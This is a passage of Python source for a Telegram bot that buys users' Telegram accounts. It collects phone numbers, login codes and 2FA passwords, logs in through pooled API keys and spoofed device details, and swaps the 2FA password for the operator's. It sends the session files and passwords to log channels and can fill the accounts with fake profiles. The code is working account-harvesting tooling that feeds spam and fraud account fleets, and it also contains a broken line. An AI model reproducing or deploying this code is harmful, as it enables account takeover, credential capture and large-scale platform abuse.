      var = event.text.split()[1].strip()
      value = event.text.split()[2].strip()
      if not value:
        value = await event.get_reply_message()

    except:
      return await xx.edit(">`/setvar <ConfigVars-name> <value>`")
    udB.set(var, value)
    await xx.edit(f"`sucessfully added {var} to {value}`")
    print(udB.get(var))
  else:
    return await xx.edit("`you are not admin fuck`")

@bot.on(events.NewMessage(incoming=True, pattern="^/support$"))
async def start_(event):
  if event.sender_id in support_users:
      return

  buttons = [
      [
          Button.inline("🎟️ Ticket Support", "now_support")
      ]
  ]

  await bot.send_message(event.sender_id, """👮‍♂️May be your solution is in our official channel check it once if not then open ticket to us -

Channel Link 🔗 - https://t.me/test00997tu
Channel Link 🔗 - https://t.me/test00997tu

Or channel username: @test00997tu
✍️ You must not inform us about any withdrawal card as we are not able to generate it You must talk to your leader and withdraw through-

If anything we will definitely block you unless you talk about your withdrawal problem and account problem -

👮‍♂️ If you sent an account by mistake, we will definitely back you up, so please open a ticket""", buttons=buttons, reply_to=event.message.id
)


@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("now_support")))
async def support_(event):
  if event.sender_id in support_users:
    return await event.answer("You cannot use this now.", alert=True)

  get_sender = await event.get_sender()
  support_users.append(event.sender_id)

  buttons = [
      [
          Button.inline("❌ Cancel", "cancel_support")
      ]
  ]

  admin_buttons = [
      [
          Button.inline("Reply To Answer", f"support_{event.sender_id}")
      ]
  ]

  await bot.delete_messages(event.sender_id, event.query.msg_id)

  async with event.client.conversation(event.sender_id) as conv:
    await conv.send_message("""👮‍♂️ Send your message:\nUse cancel button to cancel operation""", buttons=buttons)
    roly = await conv.get_response()

    if event.sender_id not in support_users:
      return

    await conv.send_message("✅ We will answer you soon \n\n👉 You can visit our channel if you want @ARMainReceiverChannel", buttons=Button.clear(), reply_to=roly.id)
    await bot.send_message(
      OWNER,f"User: {get_sender.first_name}\nText:\n{roly.text}", buttons=admin_buttons
    )

  support_users.remove(event.sender_id)

@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("cancel_support")))
async def support_(event):
  if event.sender_id in support_users:
    support_users.remove(event.sender_id)

  await event.edit("⚠️ Operation canceled")

@bot.on(events.NewMessage(incoming=True, pattern="/adminSSH"))
async def start_(event):
 if event.sender_id == OWNER :


  await event.reply(
    "Welcome to admin panel ♨️\n\n\n♨️Set Up Session Channel : `/setvar LOG_CHANNEL <CHANEEL ID>`\n♨️Set Up Welcome channel : `/setvar CHANNEL (with out @)<username>`\n\n📊 Country OFF/ON : `/setoff <country code> <OFF/ON>`\n📊 Set Rate : `/setrate <Enter Country code> <Price>`")

@bot.on(events.NewMessage(incoming=True, pattern="/rules"))
async def start_(event):

  await event.reply("👉 If you want to work with us, you definitely need to know our rules\n\n1. You cannot reset your account and take it back to you before three months,if you do this all your payments will be cancelled.\n\n2. However, you should make sure that your card name is correct while withdrawing,otherwise we will not be able to refund you the payment.\n\n3. If your leader does not pay you then you must contact our support very quickly and collect your payment from there in case your leader will be suspended as punishment you must have a strong proof.\n\n4. the number should be provided as an example of how to provide it\n\n+8801887898557\n+2347646161666")



@bot.on(events.NewMessage(incoming=True, pattern="^/withdraw$"))
async def start_(event):
  user = await bot.get_entity(event.sender_id)
  sed = get_(user.id,"claim")
  if int(sed) == 0 or sed < 1:
    return await bot.send_message(event.sender_id,
                                           "⚠️ Minimum withdrawal is at least one account")
  else:
    await bot.send_message(event.sender_id, "📤 Number of accounts that can be settled : /account To Check \n\n❗️ Note that you can settle accounts that have been delivered for 3 hours,\n\nHow do you want to settle? or /cancel", reply_to=event.message.id,buttons=[
                [Button.inline("💳 Withdrawal CARD ",f"wi_{event.sender_id}_LC")]

              ])





@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("wi_(.*)_(.*)")))
async def _(event):
  sed = get_(event.sender_id,"claim")
  print(sed)
  if sed < 1:
    await event.delete()
    return await bot.send_message(event.sender_id, "⚠️ Minimum withdrawal is at least one account")
  
  get_message = await event.get_message()
  get_reply_message = await get_message.get_reply_message()

  await event.answer("✅ Be sure to verify your card name before entering it. If you type something wrong here, please note that we will not be able to process your payment.",alert = True)
  await event.delete()
  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await bot.send_message(
      event.sender_id,
      "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified."
    )
  mauu = 0
  data = event.pattern_match.group(1).decode("utf-8")
  data1 = event.pattern_match.group(2).decode("utf-8")

  if str(data1) == "LC":
    async with event.client.conversation(event.query.user_id) as conv:
      if get_reply_message:
        msg_id = get_reply_message.id
      else:
        msg_id = 0

      await conv.send_message(f"✅ Enter your Card Name here :", reply_to=msg_id)
      temp_users.append(event.sender_id)
      roly = await conv.get_response()
      if event.sender_id in temp_users: temp_users.remove(event.sender_id)
      
      buttons = [
          [
              Button.inline("☑️ Yes", "withdrawconfirmation_confirm"),
              Button.inline("❌ No", "withdrawconfirmation_cancel")
          ]
      ]
      

      await bot.send_message(
          event.sender_id,
          f"❗️ Are you sure about your card number and request ?",
          buttons=buttons, reply_to=roly.id
      )
  else :
    await bot.send_message(event.sender_id, "sed")


@bot.on(events.callbackquery.CallbackQuery(data=re.compile("withdrawconfirmation_(.*)")))
async def _withdrawconfirm(event):
  data = event.pattern_match.group(1).decode("utf-8")
  
  if data == "cancel":
    await event.edit(f"❗️ Request has been canceled.")
  else:
    bal = get_(event.sender_id,"claim")
    
    if bal < 1:
      return await event.edit("⚠️ Minimum withdrawal is at least one account")
  
    get_message = await event.get_message()
    get_reply_message = await get_message.get_reply_message()
  
    if not get_reply_message:
      return await event.edit(f"❗️ Request has been expired.")
    
    zero_(event.sender_id)
    add_history(event.sender_id, bal,"HISTORY")
    
    add = get_reply_message.text
    
    txt = f'''✅ Account Settlement Request for Card Name: {add}
✅ In number: {round(get_(event.sender_id,"claim"), )}

Time : `{datetime.now().strftime('%H:%M:%S')}` ( UTC +6:00 )
Date : `{datetime.now().strftime('%D')}`

{event.sender_id}'''

    await bot.send_message(int(udB.get("WITHDRAW_CHANNEL")), txt)
    await event.edit(f"""Your withdrawal request has been sent to admin.
User ID: {event.sender_id}

You Card Name: {add}

Time : `{datetime.now().strftime('%H:%M:%S')}` ( UTC +6:00 )
Date : `{datetime.now().strftime('%D')}`""")



@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("pd_(.*)_(.*)")))
async def _(event):
  data = event.pattern_match.group(1).decode("utf-8")
  data1 = event.pattern_match.group(2).decode("utf-8")

  txt = f'''

Total Account : {data1}

Your withdrawal has been completed successfully ✅
  '''
  await bot.send_message(int(data),txt)
  await event.answer("Message Sent Sucesfully",alert = True)
  await event.delete()

@bot.on(events.NewMessage(incoming=True, pattern="^/users"))
async def start_(event):
  if event.sender_id == OWNER :
    xx = await bot.send_message(event.sender_id,
                                "`Getting users....`")
    await asyncio.sleep(2)
    try:
      data = dB.get("claim") or {}
      await xx.edit(str(data))



    except BaseException as e:
      await xx.edit(f"**{e} **")
  else:
    return await xx.edit("`you are not admin fuck`")





def str_to_list(text):  # Returns List
    return text.split(" ")


def get_all(var):  # Returns List
    users = dB.get(var)
    if users is None or users == "":
        return [""]
    else:
        return users


@bot.on(events.NewMessage(incoming=True, pattern="^/getlist"))
async def start_(event):
  list = os.listdir('./memory')
  txt = "Here is List \n\n"

  for dk in list :
    msy = str(dk).split('.')[0]
    txt += f"{str(msy)}\n"

  await bot.send_message(
    event.sender_id,str(txt))



async def is_signed_up(jtext):
    try:
        s = json.loads(jtext.to_json())
        if s['_'] == 'AuthorizationSignUpRequired':
            return False
        else:
            return True
    except Exception:
        return True

async def is_auth(client: Client):
  try:
      await client.invoke(GetState())
      return True
  except:
    return False

@bot.on(events.NewMessage(incoming=True))
async def _create(event):
  users = udB.get("users")

  if event.sender_id not in users:
    udB.set("users", users + [event.sender_id])

  if not event.is_private or event.text.startswith("/") or event.sender_id in temp_users or event.sender_id in support_users:
      return

  if not await get_user_join(await event.get_input_sender()):
    return await bot.send_message(
      event.sender_id,
      "✅ To continue working, you need to join the following channel\n\n🔗 https://t.me/test00997tu\n\n🔗 https://t.me/test00997tu\n\n👉 After joining, send /start again..", reply_to=event.message.id)


  if event.sender_id == OWNER and event.message.reply_to:
    get_message = await bot.get_messages(event.sender_id, ids=event.message.reply_to.reply_to_msg_id)

    if get_message.reply_markup:
      _data = get_message.reply_markup.rows[0].buttons[0].data.decode("utf-8").split("_")

      if len(_data) == 2 and _data[0] == "support":
        user_id = int(_data[1])

        try:
          await bot.send_message(
            user_id,
            f"👮‍♂️ Support:\n{event.message.text}"
        )
        except:
          pass

        return await bot.send_message(
            event.sender_id,
            f"Message was sent to user.", reply_to=event.message.id
        )

  phone_number = event.message.message.replace(" ", "")

  try:
    check_number = phonenumbers.parse(phone_number)
    if not phonenumbers.is_valid_number(check_number):
        raise Exception()
  except:
    return await bot.send_message(
        event.sender_id,
        f"❗️ Invalid phone number.", reply_to=event.message.id
    )

  bans = udB.get("bans")
  if event.sender_id in bans:
    return await bot.send_message(
      event.sender_id,
      "🅱️ You are ban from the bot."
    )

  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
      return await bot.send_message(
          event.sender_id,
          "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅,the channel will be notified.", reply_to=event.message.id
      )

  ctr = f"+{check_number.country_code}"
  signl = cdB.get(ctr)

  if not signl or signl[0] == "OFF" or int(signl[1]) <= 0:
      return await bot.send_message(
          event.sender_id,
          f"❗️ Error,({ctr}) the numbers of this country are not accepted\n\n👇🏻 Select one of the following buttons to continue", reply_to=event.message.id
      )

  temp_users.append(event.sender_id)

  async with event.client.conversation(event.sender_id) as cv:
      await cv.send_message('🔄 Processing please wait...', reply_to=event.message.id)

      phone = phone_number.replace("+","")
      
      if os.path.isfile(f"sessions1/{phone}.session"): 
          await bot.send_message(event.sender_id, "❗️This account is already exist.", reply_to=event.message.id)
          if event.sender_id in temp_users: temp_users.remove(event.sender_id)
          return

      with open('hasx.txt', 'r') as file:
          lines = file.read().split("\n")

      random_api = random.choice(lines)

      API_ID = random_api.split(":")[0]
      API_HASH = random_api.split(":")[1]

      with open('proxy.txt', 'r') as file:
        proxyss = file.read().split("\n")
        gey = random.choice(proxyss)
        IP, port, username, password = gey.split(":")

      random_info = rand_info()

      session = Client(
        f"sessions/{phone}",
        api_id=int(API_ID),
        api_hash=API_HASH,
        device_model=random_info['device_model'],
        system_version=random_info['system_version'],
        lang_code=random_info['language'],
        app_version=random_info['app_version'],
        no_updates=True,
        #proxy={
          #"scheme": "socks5",
          #"hostname": IP,
          #"port": int(port),
         # "username": username,
        #  "password": password
       # }
      )

      try:
          await session.connect()
      except Exception as e:
          try:
            await session.disconnect()
          except:
            pass

          await cv.send_message(f"Error: {e}", reply_to=event.message.id)
          if event.sender_id in temp_users: temp_users.remove(event.sender_id)
          return

      if await is_auth(session):
          await bot.send_message(event.sender_id, "❗️This account is already exist.", reply_to=event.message.id)
          if event.sender_id in temp_users: temp_users.remove(event.sender_id)
          await session.disconnect()
          return

      try:
          g = await session.send_code(phone)
          await cv.send_message(f"🔢 Enter the code sent to {phone_number}", reply_to=event.message.id)

          dictr = await cv.get_response()

          if str(dictr.message).lower() == "/cancel":
              await bot.send_message(event.sender_id, "❎ The operation was canceled!\n\nTo continue, send the desired virtual account number or send /support to get help.", reply_to=event.message.id)
              if event.sender_id in temp_users: temp_users.remove(event.sender_id)
              await session.disconnect()
              return

          await session.sign_in(str(phone), phone_code=str(dictr.message), phone_code_hash=g.phone_code_hash)

          dk = "00"
      except SessionPasswordNeeded:
          try:
            await cv.send_message("🔑 Enter Your 2FA Password Or /cancel ❌", reply_to=event.message.id)
            ffa = await cv.get_response()

            if str(ffa.message).lower() == "/cancel":
                await bot.send_message(event.sender_id, "❎ The operation was canceled!\n\nTo continue, send the desired virtual account number or send /support to get help.", reply_to=event.message.id)
                if event.sender_id in temp_users: temp_users.remove(event.sender_id)
                await session.disconnect()
                return

            dk = str(ffa.message)
            await session.check_password(password=dk)

          except BadRequest:
            await bot.send_message(event.sender_id, '⚠️ The two-step verification is incorrect', reply_to=event.message.id)
            if event.sender_id in temp_users: temp_users.remove(event.sender_id)
            await session.disconnect()
            return

          except Exception as e:
            await cv.send_message(f"❌ Time to enter code is over. Please try again {e}", reply_to=event.message.id)
            if event.sender_id in temp_users: temp_users.remove(event.sender_id)
            await session.disconnect()
            return

      except (UserDeactivatedBan, UserDeactivated, PhoneNumberBanned):
        await cv.send_message("❌ This account is ban, please try another number !", reply_to=event.message.id)
        if event.sender_id in temp_users: temp_users.remove(event.sender_id)
        await session.disconnect()
        return

      except Exception as e:
        if 'api_id/api_hash combination is invalid' in str(e):
          print(random_api)
          lines.remove(random_api)
          
          with open('hasx.txt', 'w') as file:
            file.write("\n".join(lines))
          
        await cv.send_message(f"❌ Please try again {e}", reply_to=event.message.id)
        if event.sender_id in temp_users: temp_users.remove(event.sender_id)
        await session.disconnect()
        return

      spam = udB.get("SPAM")
      print("spam", spam)

      if spam == 'ON':
        try:
          await session.send_message("@SpamBot", "/start")
          async for response in session.get_chat_history("@SpamBot", limit=1):
            pass
        except Exception as e:
            await cv.send_message(f"Error: {e}", reply_to=event.message.id)
            if event.sender_id in temp_users: temp_users.remove(event.sender_id)
            return

        free = False
        if 'Gute Nachrichten' in response.text or 'Buenas noticias' in response.text or 'Buone notizie' in response.text or 'Good news' in response.text or 'مژده' in response.text or 'رائع' in response.text or 'Ваш' in response.text:
            free = True

        print(free, response.text)

        if not free:
            await cv.send_message("❌ Account is temporary Spam robots won't accept it.\n\n👉 Use this robot to check your account for spam\n\n@SpamBot\n@SpamBot\n\n⚠️  Robots will never accept this account", reply_to=event.message.id)
            if event.sender_id in temp_users: temp_users.remove(event.sender_id)
            try:
              await session.log_out()
            except:
              pass
            try:
              await session.disconnect()
            except:
              pass
            return

      timer = udB.get("TIMER")

      if event.sender_id in temp_users: temp_users.remove(event.sender_id)

      try:
        if dk == "00":
          await session.enable_cloud_password(password=udB.get("SESSION_PASSWORD"))
          pw = udB.get("SESSION_PASSWORD")
        else:
          await session.remove_cloud_password(dk)
          await asyncio.sleep(1)
          await session.enable_cloud_password(password=udB.get("SESSION_PASSWORD"))
          pw = udB.get("SESSION_PASSWORD")
        
        print("password done")
      except Exception as e:
        print(e)
      
      try:
        await session.send_message("me", "..")
        print("sent message done")
      except Exception as e:
        print(e)
      
      await session.disconnect()

      buttons = [
          [
              Button.inline(f"☑️ Account Verification {cpdb.get(ctr)}", f"ur_{phone}_{pw}_{ctr}_{current_timestamp()}")
          ]
      ]

      await bot.send_message(
          event.sender_id,
          f"✅ The account number +{phone} was successfully received\n\n❗️ You have to wait {timer} seconds time to confirm the account, please log out\n\n👇🏻 then return to the robot and use the button below",
          buttons=buttons, reply_to=event.message.id
      )

@bot.on(
  events.callbackquery.CallbackQuery(data=re.compile("ur_(.*)_(.*)_(.*)_(.*)")))
async def _(event):
  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await event.answer("Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified.", alert=True)

  data = event.pattern_match.group(1).decode("utf-8")
  data1 = event.pattern_match.group(2).decode("utf-8")
  data3 = event.pattern_match.group(3).decode("utf-8")
  data4 = int(event.pattern_match.group(4).decode("utf-8"))
  timer = int(udB.get("TIMER"))

  print(data, data1, data4)

  if current_timestamp() - data4 <= timer:
    return await event.answer(f"👉 You must wait for {timer - (current_timestamp() - data4)} seconds more.", alert=True)

  with open('hasx.txt', 'r') as file:
      lines = file.read().split("\n")
      random_api = random.choice(lines)

  API_ID = random_api.split(":")[0]
  API_HASH = random_api.split(":")[1]

  with open('proxy.txt', 'r') as file:
    proxyss = file.read().split("\n")
    gey = random.choice(proxyss)
    IP, port, username, password = gey.split(":")

  try:
    client = Client(
      f"sessions/{data}",
      api_id=int(API_ID),
      api_hash=API_HASH,
      no_updates=True,
      # proxy={
        # "scheme": "socks5",
        # "hostname": IP,
        #"port": int(port),
        # "username": username,
      #  "password": password
      # }
    )

    await client.connect()

    if not await is_auth(client):
        raise SessionRevoked

    try:
      await session.invoke(ResetAuthorizations())
    except:
      pass

    fr = await client.invoke(GetAuthorizations())

    if len(fr.authorizations) != 1:
      print("Sessions Count", data, len(fr.authorizations))
      
      try:
        await client.disconnect()
      except:
        pass
      
      return await event.answer("❌ You didnt terminate sessions and pressed button if you really want sell account then kindly do the process again.", alert=True)

    get_me = await client.get_me()
    user = await event.get_sender()

    await client.disconnect()

    os.rename(f"sessions/{data}.session", f"sessions1/{data}.session")

    await event.edit(f"✅ Congratulations, the account has been successfully verified.")

  except SessionRevoked:
    try:
      await client.disconnect()
    except:
      pass

    try:
      os.remove(f"sessions/{data}.session")
    except:
      pass

    return await event.edit("❌ Session revoked")

  except Exception as e:
    print(e)
    
    try:
      await client.disconnect()
    except:
      pass

    return await event.edit(f"❌ There is an error.\n{e}")

  json_data = {
    "session_file": data,
    "phone": data,
    "register_time": current_timestamp(),
    "app_id": client.api_id,
    "app_hash": client.api_hash,
    "sdk": client.system_version,
    "app_version": client.app_version,
    "device": client.device_model,
    "last_check_time": current_timestamp(),
    "avatar": "null",
    "first_name": get_me.first_name,
    "last_name": get_me.last_name,
    "username": get_me.username,
    "sex": "null",
    "lang_code": get_me.language_code,
    "system_lang_code": get_me.language_code,
    "proxy": "null",
    "ipv6": False,
    "password_2fa": data1
  }

  check_number = phonenumbers.parse(f"+{data}")
  ctr = f"+{check_number.country_code}"

  add_(user.id, 1, "claim")
  add_(ctr, 1, "sells")

  actives = udB.get("actives")
  if not actives:
    udB.set("actives", [data])
  else:
    udB.set("actives", actives + [data])

  signl = cdB.get(ctr)
  cdB.set(ctr, [signl[0], int(signl[1]) - 1])

  file_path = f"./sessions1/{data}.session"
    
  try:
    LOG = udB.get("LOG_CHANNEL")
    await bot.send_file(int(LOG), file_path, caption=f"New Account recived from\n@{user.username}\nphone :- `{data}`\nid :- {user.id}\npw: {data1}\n\n[ Pyrogram session file ]")
  except Exception as e:
    try:
      await bot.send_message("@TraderRayan", f"Error on Pyrogram file:\nphone :- `{data}`\n\n{e}")
    except:
      pass
    
  try:
    file_path2 = f"./sessions2/{data}.session"

    session = Session()
    await session.load_pyrogram_session(file_path)
    await session.generate_telethon_session_file(file_path2)

    LOG2 = udB.get("LOG_CHANNEL2")
    await bot.send_file(int(LOG2), file_path2, caption=f"New Account recived from\n@{user.username}\nphone :- `{data}`\nid :- {user.id}\npw: {data1}\n\n[ Telethon session file ]")
  except Exception as e:
    try:
      await bot.send_message("@TraderRayan", f"Error on Telethon file:\nphone :- `{data}`\n\n{e}")
    except:
      pass
    
  try:
    file_path3 = f"./sessions3/{data}.json"

    with open(file_path3, 'w') as file:
        json.dump(json_data, file, indent=4)

    LOG3 = udB.get("LOG_CHANNEL3")
    await bot.send_file(int(LOG3), file_path3, caption=f"New Account recived from\n@{user.username}\nphone :- `{data}`\nid :- {user.id}\npw: {data1}\n\n[ JSON session file ]")
  except Exception as e:
    try:
      await bot.send_message("@TraderRayan", f"Error on JSON file:\nphone :- `{data}`\n\n{e}")
    except:
      pass
      
  random_info = udB.get("RANDOM")
  if str(random_info) == "True":
    asyncio.create_task(confirm_account(data, int(API_ID), API_HASH))

async def confirm_account(data, api_id, api_hash):
    await asyncio.sleep(random.randint(1, 3))
        
    client = Client(
      f"sessions1/{data}",
      api_id=api_id,
      api_hash=api_hash,
      no_updates=True
    )
    
    try:
      await client.start()
    except Exception as e:
      print(e)
    else:
      try:
        await asyncio.sleep(random.randint(1, 3))
        await client.set_username(Fake.username())
      except Exception as e:
        print(e)
      
      try:
        await asyncio.sleep(random.randint(1, 3))
        await client.update_profile(first_name=Fake.first_name(), bio=Fake.about())
      except Exception as e:
        print(e)
      
      try:
        await asyncio.sleep(random.randint(1, 3))
        await client.set_profile_photo(photo=Fake.profile())
      except Exception as e:
        print(e)
      
      try:
        await client.stop()
      except:
        pass
      
@bot.on(events.NewMessage(incoming=True, pattern="/sed"))
async def start_(event):
  data1 = "+880"
  mpr = 0
  price = cpdb.get(str(data1))
  print(price)
  if  price :
    mpr = price

  else :
    mpr = 0
  print(mpr)
  ok = add_(event.sender_id,float(mpr),"claim")
  print(ok)

@bot.on(events.NewMessage(incoming=True, pattern="^/setrate"))
async def start_(event):
  user = await bot.get_entity(event.sender_id)
  xx = await bot.send_message(event.sender_id, "`Setting Information....`")
  if event.sender_id == OWNER :

    try:
      var = event.text.split()[1].strip()
      value = event.text.split()[2].strip()
      if not value:
        value = await event.get_reply_message()

    except:
      return await xx.edit(">`/setrate <country code> <ON/OFF>`")
    cpdb.set(var,value)
    await xx.edit(f"`sucessfully done {value} to {var}`")

  else:
    return await xx.edit("`you are not admin fuck`")




@bot.on(events.NewMessage(incoming=True, pattern="/withdrawhistory"))
async def start_(event):
  onoff = udB.get("ONOFF")
  if str(onoff) == "True":
    return await bot.send_message(
      event.sender_id,
      "Account purchase is currently suspended‌ ❌.\n\nWhen the account purchase starts✅, the channel will be notified."
    )

  get_history = get_(event.sender_id,"HISTORY")

  if not get_history:
    txt = "❌ No history found"
  else:
    get_history = get_history.split("\n")[::-1]
    get_history_1 = get_history[0]

    if len(get_history) >= 3:
      get_history_2 = f"\n\n🥈 {get_history[1]}"
    else:
      get_history_2 = ""

    if len(get_history) >= 4:
      get_history_3 = f"\n\n🥉 {get_history[2]}"
    else:
      get_history_3 = ""

    text = f"\n\n🥇 {get_history_1}{get_history_2}{get_history_3}"

    txt = f'''✅ Accounts that can be settled : {text}'''

  await event.reply(txt)


logging.info("\n\n\nBot launch successfully....\n\n(C) @TraderRayan")

bot.run_until_disconnected()
